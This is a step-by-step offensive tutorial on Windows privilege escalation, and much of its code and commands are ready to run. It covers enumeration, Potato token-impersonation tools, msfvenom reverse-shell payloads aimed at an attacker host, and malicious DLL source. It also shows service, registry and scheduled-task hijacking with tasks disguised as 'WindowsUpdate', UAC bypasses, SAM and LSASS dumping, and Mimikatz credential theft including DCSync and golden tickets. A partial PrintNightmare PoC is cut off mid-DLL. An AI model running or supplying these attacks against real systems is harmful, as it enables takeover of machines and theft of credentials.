# Part 42: Advanced Windows Privilege Escalation (Steps 411-420)

## ภาพรวม
เทคนิคการยกระดับสิทธิ์บน Windows ครอบคลุม token impersonation, registry exploitation, service misconfigs, AlwaysInstallElevated, DLL hijacking, unquoted service paths, scheduled tasks, credential dumping, UAC bypass, และ Windows kernel exploits

---

## Step 411: Windows PrivEsc Enumeration

```powershell
# Windows Privilege Escalation Enumeration
# PowerShell enumeration script

Write-Host "=== Windows PrivEsc Enumeration ===" -ForegroundColor Green

# --- System Info ---
Write-Host "`n[*] System Info:" -ForegroundColor Yellow
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsArchitecture
$PSVersionTable
systeminfo

# --- Current User ---
Write-Host "`n[*] Current User:" -ForegroundColor Yellow
whoami /all  # Shows privileges and group membership

# --- Installed Hotfixes ---
Write-Host "`n[*] Installed Hotfixes:" -ForegroundColor Yellow
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
wmic qfe list brief /format:table

# --- Services ---
Write-Host "`n[*] Services running as SYSTEM:" -ForegroundColor Yellow
Get-WmiObject Win32_Service | Where-Object {$_.StartName -eq 'LocalSystem'} | 
    Select-Object Name, PathName, StartMode

# --- Unquoted service paths ---
Write-Host "`n[*] Unquoted Service Paths:" -ForegroundColor Yellow
wmic service get name,displayname,pathname,startmode 2>$null | 
    Select-String '"' -NotMatch | Select-String 'Auto' | Select-String 'C:\\'

# --- Writable service executables ---
Write-Host "`n[*] Checking service binary permissions:" -ForegroundColor Yellow
Get-WmiObject Win32_Service | Where-Object {$_.StartName -eq 'LocalSystem'} | 
    ForEach-Object {
        $path = $_.PathName -replace '"', '' -replace '\s+/.*$', ''
        if (Test-Path $path) {
            $acl = Get-Acl $path -ErrorAction SilentlyContinue
            if ($acl.AccessToString -match 'Everyone.*Write|Users.*Write|Authenticated.*Write') {
                Write-Host "WRITABLE: $path" -ForegroundColor Red
            }
        }
    }

# --- Registry Keys ---
Write-Host "`n[*] AlwaysInstallElevated:" -ForegroundColor Yellow
Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue
Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -ErrorAction SilentlyContinue

# --- Scheduled Tasks ---
Write-Host "`n[*] Scheduled Tasks:" -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq 'Highest'} | 
    Select-Object TaskName, TaskPath, @{N='Exec';E={$_.Actions.Execute}} | 
    Where-Object {$_.Exec -notlike '*system32*'}

# --- Credentials ---
Write-Host "`n[*] Stored Credentials:" -ForegroundColor Yellow
cmdkey /list
vaultcmd /list

# --- DLL Hijacking ---
Write-Host "`n[*] DLL search paths:" -ForegroundColor Yellow
$env:PATH -split ';' | Where-Object {Test-Path $_} | 
    ForEach-Object {
        $acl = Get-Acl $_ -ErrorAction SilentlyContinue
        if ($acl.AccessToString -match 'Write') {
            Write-Host "Writable PATH dir: $_"
        }
    }

# --- Network ---
Write-Host "`n[*] Network connections:" -ForegroundColor Yellow
netstat -ano | Select-String 'LISTENING'

# --- AutoRun entries ---
Write-Host "`n[*] AutoRun entries:" -ForegroundColor Yellow
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'

# --- Security software ---
Write-Host "`n[*] Antivirus/Security:" -ForegroundColor Yellow
Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct 2>$null | 
    Select-Object displayName
```

---

## Step 412: Token Impersonation และ Hot Potato

```csharp
// Token Impersonation via SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
// C# implementation demonstrating Potato attacks

using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class TokenImpersonation
{
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass,
        IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    
    // Check current token privileges
    public static void EnumeratePrivileges()
    {
        // whoami /priv equivalent
        var process = Process.Start(new ProcessStartInfo("whoami", "/priv")
        {
            RedirectStandardOutput = true, UseShellExecute = false
        });
        Console.WriteLine(process.StandardOutput.ReadToEnd());
    }
    
    // Key privileges for PrivEsc:
    // SeImpersonatePrivilege - Impersonate a client after authentication
    // SeAssignPrimaryTokenPrivilege - Replace process-level token  
    // SeDebugPrivilege - Debug other processes
    // SeTcbPrivilege - Act as part of OS
}
```

```bash
# Potato Attack Family (Windows Token Impersonation)

# Check for SeImpersonatePrivilege
whoami /priv | findstr /i "impersonate"

# Tools for Potato attacks:
# These work when SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is available
# Common in: IIS, MSSQL service accounts, service users

# ============ JuicyPotato ============
# Works on: Windows < Server 2019, Windows 10 < 1809
JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe \\
    -a "/c whoami > C:\\Users\\Public\\whoami.txt" \\
    -t * -c "{CLSID}"

# Find working CLSID for target OS:
# https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

# Common CLSIDs:
# Win10 Enterprise 1803: {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
# Win Server 2019:       {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}

# ============ PrintSpoofer ============
# Works on: Windows 10 / Server 2019
# Requires: SeImpersonatePrivilege
PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -c "C:\\Windows\\System32\\cmd.exe"

# ============ RoguePotato ============  
# Works on: Windows Server 2019 / Windows 10
# Better than JuicyPotato for newer Windows
RoguePotato.exe -r 10.10.10.10 -e "C:\\revshell.exe" -l 9999

# ============ SweetPotato ============
SweetPotato.exe -e EfsRpc -p C:\\Windows\\System32\\cmd.exe \\
    -a "/c whoami"

# ============ GodPotato ============
# Works on all Windows versions
GodPotato.exe -cmd "whoami"
GodPotato.exe -cmd "cmd /c C:\\revshell.exe"
```

---

## Step 413: Registry Exploitation

```powershell
# Registry-based Privilege Escalation

# ============ AlwaysInstallElevated ============

# Check if AlwaysInstallElevated is enabled
$hklm = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' `
    -Name 'AlwaysInstallElevated' -ErrorAction SilentlyContinue
$hkcu = Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' `
    -Name 'AlwaysInstallElevated' -ErrorAction SilentlyContinue

if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
    Write-Host "[!] AlwaysInstallElevated is ENABLED! Create malicious MSI!" -ForegroundColor Red
    
    # Create MSI payload with msfvenom:
    # msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 \
    #          -f msi -o evil.msi
    # Then: msiexec /quiet /qn /i evil.msi
}

# ============ Autorun Registry Keys ============

# Check writable autorun keys
$autorun_keys = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
)

foreach ($key in $autorun_keys) {
    try {
        $acl = Get-Acl $key -ErrorAction Stop
        foreach ($access in $acl.Access) {
            if ($access.FileSystemRights -match 'Write|FullControl' -and
                $access.IdentityReference -match 'Users|Everyone|Authenticated') {
                Write-Host "Writable autorun key: $key" -ForegroundColor Red
            }
        }
    } catch {}
}

# ============ Service Registry Permissions ============

# Check writable service registry keys
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' | ForEach-Object {
    try {
        $acl = Get-Acl $_.PSPath
        foreach ($access in $acl.Access) {
            if ($access.FileSystemRights -match 'Write|FullControl' -and
                $access.IdentityReference -notmatch 'SYSTEM|Administrators|TrustedInstaller') {
                Write-Host "Writable service key: $($_.PSPath)" -ForegroundColor Red
                Write-Host "  Identity: $($access.IdentityReference)"
                Write-Host "  Rights: $($access.FileSystemRights)"
            }
        }
    } catch {}
}

# Modify service to run our payload:
# reg add "HKLM\SYSTEM\CurrentControlSet\Services\vuln_service" /t REG_EXPAND_SZ /v ImagePath /d "C:\\payload.exe" /f

# ============ SAM Registry Hive ============

# Check if SAM is readable (shadow copy trick)
reg save HKLM\SAM C:\\Temp\\sam.hive 2>$null
reg save HKLM\SYSTEM C:\\Temp\\system.hive 2>$null
reg save HKLM\SECURITY C:\\Temp\\security.hive 2>$null

# If volume shadow copies exist:
vssadmin list shadows
$shadow = (vssadmin list shadows /for=C: | Select-String 'Shadow Copy Volume Name' | 
    Select-Object -Last 1).Line -replace '.*Shadow Copy Volume Name: ', ''
cmd /c copy "${shadow}\Windows\System32\config\SAM" C:\\Temp\\sam.hive
cmd /c copy "${shadow}\Windows\System32\config\SYSTEM" C:\\Temp\\system.hive
```

---

## Step 414: Service Binary Hijacking

```python
import subprocess
import re
from typing import List, Dict

class WindowsServicePrivEsc:
    """ใช้ Windows Services เพื่อ PrivEsc"""
    
    def find_unquoted_service_paths(self) -> List[Dict]:
        """Find services with unquoted paths containing spaces"""
        vulnerable = []
        
        try:
            result = subprocess.run(
                ['wmic', 'service', 'get', 'name,displayname,pathname,startmode'],
                capture_output=True, text=True, shell=True
            )
            
            for line in result.stdout.split('\n'):
                # Check for unquoted path with spaces
                # Pattern: path starts without quote, contains space, is in C:\
                match = re.search(r'^(\w.+?)\s+(\w.*?)\s+(C:\\[^"\\n]+\s+[^"\\n]*\.exe)', line)
                if match:
                    path = match.group(3).strip()
                    name = match.group(1).strip()
                    
                    # Check for spaces (without quotes)
                    if ' ' in path and not path.startswith('"'):
                        vulnerable.append({
                            'name': name,
                            'path': path,
                            'exploit_paths': self._get_exploit_paths(path)
                        })
                        print(f"VULNERABLE: {name}")
                        print(f"  Path: {path}")
        except Exception as e:
            print(f"Error: {e}")
        
        return vulnerable
    
    def _get_exploit_paths(self, service_path: str) -> List[str]:
        """Calculate possible exploit paths for unquoted service"""
        # Example: C:\Program Files\Vulnerable App\Service.exe
        # Windows tries:
        # 1. C:\Program.exe
        # 2. C:\Program Files\Vulnerable.exe
        # 3. C:\Program Files\Vulnerable App\Service.exe
        
        paths = service_path.split('\\')
        exploit_paths = []
        
        current = ''
        for i, part in enumerate(paths[:-1]):  # Exclude the actual exe
            if i == 0:
                current = part
            else:
                if ' ' in part:
                    # Could exploit here
                    exploit_path = current + '\\' + part.split(' ')[0] + '.exe'
                    exploit_paths.append(exploit_path)
                current = current + '\\' + part
        
        return exploit_paths
    
    def generate_service_exploit(self, service_name: str, 
                                  exploit_path: str) -> str:
        """Generate commands to exploit vulnerable service"""
        return f"""
# Exploit: {service_name}
# Write payload to: {exploit_path}

# Using msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 \\
    -f exe -o payload.exe

# Upload payload to exploit path:
copy payload.exe "{exploit_path}"

# Restart service (if we have permission) or wait for restart:
sc stop {service_name}
sc start {service_name}
# OR
net stop {service_name}
net start {service_name}

# Wait for reboot:
shutdown /r /t 0  # If we have SeShutdownPrivilege
"""
    
    def check_service_permissions(self, service_name: str) -> Dict:
        """Check permissions on service binary"""
        result = {
            'service': service_name,
            'binary_path': None,
            'writable': False,
            'start_allowed': False
        }
        
        try:
            sc_result = subprocess.run(
                ['sc', 'qc', service_name],
                capture_output=True, text=True, shell=True
            )
            
            for line in sc_result.stdout.split('\n'):
                if 'BINARY_PATH_NAME' in line:
                    path = line.split(':')[1].strip().strip('"')
                    result['binary_path'] = path
                    
                    # Check if writable
                    icacls_result = subprocess.run(
                        ['icacls', path],
                        capture_output=True, text=True, shell=True
                    )
                    if any(x in icacls_result.stdout for x in [
                        'Everyone:(F)', 'Everyone:(W)', 'Users:(F)', 'Users:(W)'
                    ]):
                        result['writable'] = True
            
            # Check if we can start service
            access_result = subprocess.run(
                ['sc', 'qc', service_name],
                capture_output=True, text=True, shell=True
            )
            result['start_allowed'] = 'START_TYPE' in access_result.stdout
        except Exception as e:
            print(f"Error: {e}")
        
        return result


# PowerShell version for better accuracy
SERVICE_EXPLOIT_PS1 = '''
# PowerShell service exploitation

# Method 1: Replace writable service binary
$service = Get-WmiObject Win32_Service -Filter "Name='VulnerableService'"
$binaryPath = $service.PathName -replace '"', ''
$binaryPath = ($binaryPath -split '\.exe')[0] + '.exe'

# Check if writable
if (Test-Path $binaryPath) {
    $acl = Get-Acl $binaryPath
    # Generate payload and copy
    copy-item C:\\payload.exe $binaryPath -Force
    Write-Host "Binary replaced!"
}

# Restart service
Restart-Service VulnerableService -ErrorAction SilentlyContinue

# Method 2: Modify service ImagePath in registry
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnService" `
    /v ImagePath /t REG_EXPAND_SZ /d "C:\\Windows\\Temp\\payload.exe" /f

# Method 3: sc config to change binary path
sc.exe config VulnService binpath= "C:\\Windows\\Temp\\payload.exe"
sc.exe start VulnService
'''
```

---

## Step 415: DLL Hijacking บน Windows

```python
import os
import subprocess
from typing import List, Dict

class DLLHijacking:
    """ค้นหาและใช้ DLL hijacking เพื่อ PrivEsc"""
    
    DLL_SEARCH_ORDER = [
        'Application directory',
        'System32 (C:\\Windows\\System32)',
        'System (C:\\Windows\\System)',
        'Windows (C:\\Windows)',
        'Current directory',
        'PATH directories'
    ]
    
    def find_missing_dlls_procmon(self) -> str:
        """Instructions for finding missing DLLs via ProcMon"""
        return """
Using Process Monitor to find DLL hijacking opportunities:

1. Download and run Procmon.exe (Sysinternals)
2. Set filter:
   - Process Name: target_process.exe
   - Path: ends with .dll
   - Result: NAME NOT FOUND
3. Look for DLLs loaded from writable directories
4. Check DLL search order for target application

Key filters in ProcMon:
- Filter > Add > Path > ends with > .dll > Include
- Filter > Add > Result > is > NAME NOT FOUND > Include
- Filter > Add > Operation > is > CreateFile > Include

Look for patterns like:
  CreateFile 'C:\\Program Files\\App\\missing.dll' NAME NOT FOUND
  CreateFile 'C:\\Windows\\System32\\missing.dll' NAME NOT FOUND  
  CreateFile 'C:\\Windows\\missing.dll' NAME NOT FOUND
  CreateFile 'C:\\Users\\user\\Desktop\\missing.dll' NAME NOT FOUND  <- EXPLOITABLE!
"""
    
    def create_malicious_dll(self, dll_name: str, 
                              lhost: str, lport: int) -> str:
        """Create malicious DLL payload"""
        dll_c_code = f"""
// Malicious DLL: {dll_name}
// Compile: x86_64-w64-mingw32-gcc -shared -o {dll_name} dll_payload.c

#include <windows.h>
#include <stdlib.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {{
    switch (fdwReason) {{
        case DLL_PROCESS_ATTACH:
            // Execute payload when DLL is loaded
            system("cmd.exe /c powershell.exe -enc BASE64_PAYLOAD");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }}
    return TRUE;
}}

// Also export the expected function to prevent crashes
void WINAPI ExpectedFunction(void) {{
    return;
}}
"""
        return dll_c_code
    
    def find_writable_dll_locations(self) -> List[str]:
        """Find directories in PATH that are writable"""
        writable = []
        path_dirs = os.environ.get('PATH', '').split(';')
        
        for directory in path_dirs:
            if directory and os.path.exists(directory):
                test_file = os.path.join(directory, 'test_write_' + str(os.getpid()))
                try:
                    with open(test_file, 'w') as f:
                        f.write('test')
                    os.remove(test_file)
                    writable.append(directory)
                    print(f"Writable PATH dir: {directory}")
                except Exception:
                    pass
        
        return writable
    
    def check_application_for_dll_hijacking(self, exe_path: str) -> str:
        """Check application for DLL hijacking using dependencies"""
        return f"""
# Check DLL dependencies with Dependency Walker (depends.exe)
depends.exe {exe_path}

# Or use dumpbin:
dumpbin /IMPORTS {exe_path}

# Or strings:
strings {exe_path} | grep -i '\.dll'

# PowerShell - List DLLs loaded by process:
$process = Get-Process -Name 'target_app'
$process.Modules | Select-Object FileName | Sort-Object FileName

# Check for DLLs loaded from non-system paths:
Get-Process | ForEach-Object {{
    $p = $_
    $_.Modules | Where-Object {{$_.FileName -notlike '*Windows*'}} | 
        ForEach-Object {{Write-Host "$($p.Name): $($_.FileName)"}}
}}
"""
    
    def hijack_windows_dll(self, service_name: str) -> str:
        """Classic Windows DLL hijacking example"""
        return """
# Common DLL hijacking targets in Windows:

# 1. wlbsctrl.dll - IKEEXT service
# Location needed: C:\\Windows\\System32\\wlbsctrl.dll
# If we can write to System32 (rare) or service dir

# 2. WindowsCoreDeviceInfo.dll - Device Association Service

# 3. DLLs loaded from current directory for autorun apps

# Example: Application loads 'version.dll' from its own directory
# but version.dll is in System32. If app dir is writable:

# Create hijack DLL:
cat > version.c << 'EOF'
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID res) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Add registry key for persistence / spawn reverse shell
        WinExec("cmd.exe /c C:\\Windows\\Temp\\shell.exe", SW_HIDE);
    }
    return TRUE;
}
EOF

x86_64-w64-mingw32-gcc -shared -o version.dll version.c
copy version.dll "C:\\Program Files\\VulnerableApp\\"
"""
```

---

## Step 416: Scheduled Task Exploitation

```powershell
# Scheduled Task Privilege Escalation

# Find scheduled tasks running as SYSTEM with writable executables
$tasks = Get-ScheduledTask | Where-Object {
    $_.Principal.RunLevel -eq 'Highest' -or
    $_.Principal.UserId -eq 'SYSTEM' -or
    $_.Principal.UserId -eq 'NT AUTHORITY\\SYSTEM'
}

foreach ($task in $tasks) {
    $action = $task.Actions | Where-Object {$_ -is [Microsoft.Management.Infrastructure.CimInstance]}
    $exe = $action.Execute
    
    if ($exe -and (Test-Path $exe)) {
        $acl = Get-Acl $exe -ErrorAction SilentlyContinue
        foreach ($access in $acl.Access) {
            if ($access.FileSystemRights -match 'Write|FullControl' -and
                $access.IdentityReference -match 'Users|Everyone|Authenticated') {
                Write-Host "VULNERABLE TASK: $($task.TaskName)" -ForegroundColor Red
                Write-Host "  Binary: $exe"
                Write-Host "  Identity: $($access.IdentityReference)"
            }
        }
    }
}

# Create malicious scheduled task (if we can write to task XML)
$taskXML = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\Temp\payload.exe</Command>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
</Task>
"@

# Register task
Register-ScheduledTask -Xml $taskXML -TaskName "WindowsUpdate" -Force
Start-ScheduledTask -TaskName "WindowsUpdate"

# Command line version:
schtasks /create /sc ONLOGON /tn "WindowsDefender" /tr "C:\\Windows\\Temp\\payload.exe" /ru SYSTEM
schtasks /run /tn "WindowsDefender"
```

---

## Step 417: UAC Bypass Techniques

```python
import subprocess
import winreg
import os
from typing import List

class UACBypass:
    """User Account Control Bypass Techniques"""
    
    def check_uac_level(self) -> Dict:
        """ตรวจสอบ UAC configuration"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            )
            
            levels = {
                0: 'Never notify (UAC disabled)',
                1: 'Notify only for apps (default)',
                2: 'Notify always (most secure)',
                5: 'Default for admin accounts'
            }
            
            consent_prompt_value = winreg.QueryValueEx(key, 'ConsentPromptBehaviorAdmin')[0]
            prompt_on_secure = winreg.QueryValueEx(key, 'PromptOnSecureDesktop')[0]
            
            return {
                'consent_prompt': consent_prompt_value,
                'prompt_on_secure': prompt_on_secure,
                'level': levels.get(consent_prompt_value, 'Unknown'),
                'bypassable': consent_prompt_value != 2
            }
        except Exception:
            return {}
    
    def fodhelper_bypass(self, payload: str) -> str:
        """UAC bypass via fodhelper.exe (Windows 10)"""
        return f"""
# FodHelper UAC bypass
# Requires: Medium integrity, admin group membership
# Target: Windows 10 (various builds)

# PowerShell:
New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force
New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" `
    -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" `
    -Name "(default)" -Value "{payload}" -Force

Start-Process "fodhelper.exe" -Wait

# Cleanup
Remove-Item "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force
"""
    
    def eventvwr_bypass(self, payload: str) -> str:
        """UAC bypass via eventvwr.exe (Windows 7/10)"""
        return f"""
# EventVwr UAC bypass
# Sets registry key that eventvwr auto-runs with elevated privileges

# PowerShell:
New-Item -Path "HKCU:\\Software\\Classes\\mscfile\\Shell\\Open\\command" -Value "{payload}" -Force
Start-Process 'C:\\Windows\\System32\\eventvwr.exe' -Wait

# Cleanup:
Remove-Item -Path "HKCU:\\Software\\Classes\\mscfile" -Recurse -Force
"""
    
    def sdclt_bypass(self, payload: str) -> str:
        """UAC bypass via sdclt.exe (Windows 10)"""
        return f"""
# sdclt.exe UAC bypass
# Works on Windows 10

New-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" `
    -Value "{payload}" -Force

Start-Process sdclt.exe

# Cleanup:
Remove-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" -Force
"""
    
    def cmstp_bypass(self, payload: str) -> str:
        """CMSTP.exe UAC bypass (LOLBIN)"""
        return f"""
# CMSTP.exe UAC bypass via INF file
# Works on Windows 7/10

# Create malicious INF file:
$inf = @"
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\\scrobj.dll,NI,{payload}
"@

$inf | Out-File C:\\Windows\\Temp\\evil.inf -Encoding ascii
cmstp.exe /au C:\\Windows\\Temp\\evil.inf
"""

    def bypass_summary(self) -> List[Dict]:
        """Summary of UAC bypass techniques"""
        return [
            {'method': 'fodhelper', 'target_process': 'fodhelper.exe',
             'os': 'Win10', 'requires': 'Admin group member'},
            {'method': 'eventvwr', 'target_process': 'eventvwr.exe',
             'os': 'Win7/10', 'requires': 'Admin group member'},
            {'method': 'sdclt', 'target_process': 'sdclt.exe',
             'os': 'Win10', 'requires': 'Admin group member'},
            {'method': 'cmstp', 'target_process': 'cmstp.exe',
             'os': 'Win7/10', 'requires': 'Admin group member'},
            {'method': 'computerdefaults', 'target_process': 'computerdefaults.exe',
             'os': 'Win10', 'requires': 'Admin group member'},
            {'method': 'bypassuac_injection', 'target_process': 'dllhost.exe',
             'os': 'Win7/8/10', 'requires': 'Admin group member'},
        ]
```

---

## Step 418: Windows Credential Dumping

```python
# Windows Credential Dumping Techniques

WINDOWS_CRED_DUMP = '''
# ============================================================
# Mimikatz - The King of Windows Credential Dumping
# ============================================================

# Interactive mode
mimikatz.exe
privilege::debug
token::elevate

# Dump all credentials
lsadump::sam  # SAM database (local accounts)
lsadump::lsa /patch  # LSA secrets
lsadump::cache  # Cached domain credentials
lsadump::secrets  # LSA Secrets from registry

# Dump logon passwords (requires LSASS access)
sekurlsa::logonpasswords  # Full dump
sekurlsa::wdigest  # Clear-text passwords if WDigest enabled
sekurlsa::kerberos  # Kerberos tickets
sekurlsa::msv  # MSV (NTLM) hashes
sekurlsa::tspkg  # Terminal services

# Golden/Silver Ticket
kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500
kerberos::silver /user:admin /domain:corp.local /sid:S-1-5-21-xxx /target:server.corp.local /service:cifs /rc4:HASH

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:. /ntlm:HASH /run:cmd.exe

# DCSync
lsadump::dcsync /user:krbtgt
lsadump::dcsync /user:Administrator /domain:corp.local
lsadump::dcsync /all /csv  # All hashes

# One-liner from command prompt:
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt

# ============================================================
# LSASS Memory Dump (bypass AV)
# ============================================================

# Method 1: Task Manager (GUI)
# Open Task Manager > Details > lsass.exe > Create dump file

# Method 2: ProcDump (Sysinternals)
procdump.exe -ma lsass.exe lsass.dmp
procdump.exe -ma -64 lsass.exe lsass.dmp  # 64-bit process

# Method 3: PowerShell MiniDump
$proc = Get-Process lsass
$dumpPath = "C:\\Windows\\Temp\\lsass.dmp"
[System.IO.File]::WriteAllBytes($dumpPath, [byte[]]$(New-Object System.Diagnostics.ProcessDump).Dump($proc))

# Method 4: comsvcs.dll (LOLBIN)
tasklist | findstr lsass
rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 632 C:\\Temp\\lsass.dmp full

# Method 5: PowerSploit Out-Minidump
Import-Module .\\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes (Get-Content -Encoding Byte .\\mimikatz.exe) -ExeArgs "exit"

# Parse dump offline with mimikatz:
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# Or with pypykatz (Python mimikatz):
pypykatz lsa minidump lsass.dmp

# ============================================================
# DPAPI - Data Protection API
# ============================================================

# Dump DPAPI master keys:
mimikatz.exe "dpapi::masterkey" "exit"

# Decrypt DPAPI blobs (browser passwords, etc.):
# Chrome passwords location:
# %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Dump with mimikatz:
mimikatz.exe "dpapi::chrome /in:\"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\""

# ============================================================
# Credential Manager
# ============================================================
vaultcmd /list
vaultcmd /listproperties:{GUID}
vaultcmd /listcreds:{GUID} /unencrypted

mimikatz.exe "vault::list" "vault::cred /patch" "exit"

# Windows Credential Editor
wce.exe -w  # Extract cached credentials
wce.exe -s <username>:<domain>:<lmhash>:<nthash>  # Set credentials
'''
```

---

## Step 419: Windows Kernel Exploits

```bash
# Windows Kernel Privilege Escalation

# Check Windows version
SystemInfo
ver
wmic os get caption, version, buildnumber

# Check for installed patches
wmic qfe list brief | findstr KB
Get-HotFix | Sort-Object InstalledOn -Descending

# ============ Notable Windows Kernel CVEs ============

: CVE-2021-34527 (PrintNightmare)
: Windows Print Spooler RCE/PrivEsc
: Affects virtually all Windows versions
: Local PrivEsc + Remote Code Execution

: CVE-2021-1675 (PrintNightmare)
: Print Spooler PrivEsc
: All unpatched Windows

: CVE-2020-1472 (ZeroLogon)
: Netlogon protocol vulnerability
: Domain Controller takeover

: CVE-2020-0796 (SMBGhost)
: SMBv3 compression RCE
: Windows 10/Server 1903-1909

: CVE-2019-0708 (BlueKeep)
: RDP RCE, pre-authentication
: Windows XP, 7, Server 2003, 2008

: CVE-2017-0144 (MS17-010 EternalBlue)
: SMBv1 RCE
: Windows XP, 7, 8.1, 10, Server 2003-2016

: CVE-2016-3225 (MS16-075 Hot Potato)
: NTLM relay to SYSTEM via Windows Update

: CVE-2015-1701 (MS15-051)
: Win32k.sys privilege escalation
: Windows 7/8/Server 2008/2012

# ============ PrintNightmare PoC ============
```

```python
# PrintNightmare (CVE-2021-34527) Local Privilege Escalation
# Python implementation

import ctypes
import ctypes.wintypes
import os
from typing import Optional

class PrintNightmare:
    """
    CVE-2021-34527 PrintNightmare PoC
    Local PrivEsc via Windows Print Spooler
    """
    
    def check_spooler_running(self) -> bool:
        """Check if Print Spooler service is running"""
        import subprocess
        result = subprocess.run(
            ['sc', 'query', 'Spooler'],
            capture_output=True, text=True, shell=True
        )
        return 'RUNNING' in result.stdout
    
    def exploit_local(self, dll_path: str) -> str:
        """
        Local PrivEsc via AddPrinterDriver
        dll_path: Path to malicious DLL
        """
        # This is a simplified representation - actual PoC requires
        # Windows API calls that are complex to implement safely
        return f"""
# PrintNightmare Local PrivEsc
# Requires: Low-privileged user on Windows with unpatched Spooler

# PowerShell PoC (simplified):
$driver = @{{
    cVersion = 3
    pName = 'Windows NT x86'
    pEnvironment = 'Windows NT x86'
    pDriverPath = '{dll_path}'
    pDataFile = 'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\UNIDRV.DLL'
    pConfigFile = 'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\UNIDRVUI.DLL'
    pPrintProcessor = 'winprint'
}}

# Alternative: Use impacket
python3 CVE-2021-1675.py TARGET/user:password@TARGET

# Test if vulnerable:
Get-PrinterDriver | Select Name, DriverPath | Format-List
Get-Service Spooler
"""
    
    def generate_malicious_dll(self) -> str:
        """Generate DLL for PrintNightmare"""
        return """
// PrintNightmare malicious DLL
// Compile: cl /LD /D_USRDLL /D_WINDLL dll.c /link /EXPORT:DllMain

#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch(fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Add admin user
